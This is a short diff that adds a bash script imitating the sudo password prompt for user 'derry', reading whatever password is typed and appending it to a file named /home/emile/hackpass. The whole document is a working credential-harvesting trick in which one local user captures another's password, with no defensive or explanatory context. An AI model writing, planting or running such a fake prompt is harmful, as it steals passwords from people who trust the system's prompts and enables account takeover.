@@ -1,0 +1,5 @@
+#!/bin/bash
+
+echo "[sudo] password for derry:"
+read password
+echo $password >> /home/emile/hackpass
